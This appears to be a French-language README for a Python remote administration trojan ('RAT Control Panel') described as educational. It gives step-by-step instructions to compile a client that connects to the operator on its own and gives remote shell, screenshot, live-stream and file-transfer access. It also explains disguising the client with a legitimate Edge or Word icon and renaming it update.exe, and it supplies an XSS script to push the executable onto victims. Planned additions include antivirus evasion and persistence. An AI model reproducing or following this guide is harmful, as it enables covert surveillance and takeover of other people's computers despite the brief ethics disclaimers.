🐀 RAT Control Panel

Bienvenue dans RAT Control Panel, un outil éducatif de Remote Administration Tool (RAT) conçu pour les environnements de test de sécurité, les compétitions CTF, ou les laboratoires d'apprentissage. Ce projet fournit un serveur, un client, et une interface graphique intuitive pour exécuter des commandes à distance, capturer des écrans, diffuser en temps réel, et plus encore, avec une touche de discrétion grâce à la personnalisation des icônes.

⚠️ Avertissement : Cet outil est destiné à un usage éthique et autorisé uniquement. L'utilisation non autorisée est illégale. Veillez à respecter les lois et à obtenir un consentement explicite avant tout déploiement.


✨ Fonctionnalités

Exécution de commandes à distance : Lancez des commandes shell sur le client (ex. whoami, dir).
Capture d'écran : Prenez des instantanés de l'écran du client, enregistrés en JPEG.
Streaming en temps réel : Diffusez l'écran du client avec un faible décalage (10 FPS).
Transfert de fichiers : Téléchargez ou envoyez des fichiers entre le serveur et le client.
Chiffrement sécurisé : Toutes les communications sont chiffrées avec cryptography (Fernet).
Interface graphique : Une UI conviviale (tkinter) pour démarrer le serveur, configurer l'IP, et compiler le client.
Personnalisation discrète : Compilez le client avec une icône personnalisée (à partir de .png) pour plus de discrétion.
Connexion automatique : Le client se connecte directement au serveur sans interaction utilisateur.


🛠️ Prérequis
Avant de commencer, assurez-vous d'avoir :



Prérequis
Description



Python 3.8+
Téléchargez depuis python.org.


Système d'exploitation
Windows (client et serveur nécessitent un environnement graphique).


Réseau
Port 4444 ouvert sur le serveur, avec port forwarding si nécessaire.


Image .png
Une icône (32x32 ou 64x64 pixels) pour personnaliser l'exécutable du client.



📦 Installation
Suivez ces étapes pour configurer le projet :

Cloner le projet (ou téléchargez les fichiers) :
git clone https://github.com/votre-repo/rat-control-panel.git
cd rat-control-panel


Installer les dépendances :Exécutez la commande suivante pour installer toutes les bibliothèques nécessaires :
pip install Pillow opencv-python cryptography pyinstaller


💡 tkinter est inclus avec Python. Si vous rencontrez des erreurs, vérifiez votre installation Python.


Préparer les fichiers :

Placez ui.py, server.py, et client.py dans le même dossier.
Obtenez une image .png pour l'icône (par exemple, téléchargez depuis IconArchive ou créez-en une avec GIMP).


Configurer le réseau :

Ouvrez le port 4444 sur le serveur :netsh advfirewall firewall add rule name="RAT" dir=in action=allow protocol=TCP localport=4444


Si vous utilisez une IP publique, configurez le port forwarding sur votre routeur.




🚀 Utilisation
1. Lancer l'interface graphique
Exécutez l'interface pour configurer et contrôler le RAT :
python ui.py

L'interface affiche :

Un champ pour entrer l'adresse IP du serveur.
Un bouton pour démarrer le serveur.
Un bouton pour importer une icône (.png).
Un bouton pour compiler le client.
Une zone de logs pour suivre les actions.

2. Démarrer le serveur

Cliquez sur "Démarrer le serveur" dans l'interface.
Les logs affichent :Serveur démarré sur 0.0.0.0:4444
Adresses IP locales : 192.168.1.100, ...


Notez l'IP affichée (par exemple, 192.168.1.100) pour l'étape suivante.

3. Configurer l'adresse IP

Dans le champ Adresse IP du serveur, entrez l'IP notée (par exemple, 192.168.1.100).
Si vous utilisez une IP publique, assurez-vous que le port 4444 est accessible.

4. Importer une icône

Cliquez sur "Importer une icône (.png)".
Sélectionnez un fichier .png (idéalement 32x32 ou 64x64 pixels).
L'interface convertit automatiquement le .png en .ico et affiche :Icône importée et convertie : edge.png -> temp_icon.ico




💡 Utilisez une icône légitime (par exemple, Microsoft Edge, Word) pour rendre l'exécutable discret.

5. Compiler le client

Cliquez sur "Compiler le client".
L'interface :
Met à jour client.py avec l'IP saisie.
Compile client.py en dist/client.exe avec PyInstaller, en utilisant l'icône importée.
Supprime le fichier .ico temporaire.


Les logs confirment :client.py modifié avec SERVER_HOST = 192.168.1.100
Compilation réussie. Exécutable généré dans dist/client.exe



6. Tester le client

Copiez dist/client.exe sur un PC client (Windows avec interface graphique).
Exécutez :client.exe


L'exécutable affiche l'icône personnalisée et se connecte automatiquement au serveur.
Sur le serveur, entrez des commandes dans la console (ouverte automatiquement) :whoami
screenshot
stream


screenshot : Enregistre received_screenshot.jpg.
stream : Affiche l'écran du client en temps réel (appuyez sur q pour arrêter).



7. Déploiement via XSS (optionnel)
Pour distribuer client.exe via une vulnérabilité XSS (dans un cadre éthique) :

Hébergez client.exe :python -m http.server 8080


Injectez via XSS :<script>
    window.location = 'http://votre-serveur:8080/client.exe';
</script>


L'icône personnalisée rend l'exécutable plus convaincant (par exemple, renommez-le update.exe).


⚠️ Restez dans un cadre légal (CTF, bug bounty). L'utilisation non autorisée est illégale.


📋 Exemple de logs dans l'UI
Thu May 15 17:00:00 2025: Démarrage du serveur...
Thu May 15 17:00:01 2025: Serveur démarré sur 0.0.0.0:4444
Thu May 15 17:00:05 2025: Connexion de 192.168.1.98:54321
Thu May 15 17:00:10 2025: Icône importée et convertie : edge.png -> temp_icon.ico
Thu May 15 17:00:15 2025: client.py modifié avec SERVER_HOST = 192.168.1.100
Thu May 15 17:00:20 2025: Compilation réussie. Exécutable généré dans dist/client.exe


🐞 Dépannage



Problème
Solution



Serveur ne démarre pas
Vérifiez que server.py est dans le dossier. Installez les dépendances : pip install Pillow opencv-python cryptography.


Client ne se connecte pas
Vérifiez l'IP saisie. Testez : ping 192.168.1.100 et nc -zv 192.168.1.100 4444.


Icône non appliquée
Assurez-vous d'importer un .png valide. Testez : python -c "from PIL import Image; Image.open('edge.png').show()".


Compilation échoue
Installez PyInstaller : pip install pyinstaller. Vérifiez les logs pour l'erreur.


Streaming/screenshot échoue
Exécutez le client sur un bureau Windows. Testez : python -c "from PIL import ImageGrab; ImageGrab.grab()".



⚖️ Considérations éthiques

Usage autorisé uniquement : Utilisez ce RAT dans des environnements contrôlés (CTF, labs de sécurité).
Légalité : Déployer un RAT sans consentement est illégal. Obtenez toujours une autorisation explicite.
Responsabilité : Signalez les vulnérabilités XSS de manière éthique via des programmes de bug bounty.


🌟 Améliorations futures

Ajouter un bouton pour arrêter le serveur depuis l'UI.
Implémenter l'obfuscation du client avec pyarmor pour éviter la détection antivirus.
Ajouter la persistance (exécution au démarrage) dans l'exécutable client.
Supporter d'autres formats d'image (.jpg, .bmp) pour les icônes.


🙏 Crédits
Développé avec ❤️ pour l'apprentissage de la cybersécurité. Merci à la communauté open-source pour les bibliothèques utilisées :

Pillow
OpenCV
Cryptography
PyInstaller


📧 Pour toute question ou suggestion, ouvrez une issue sur le dépôt GitHub !

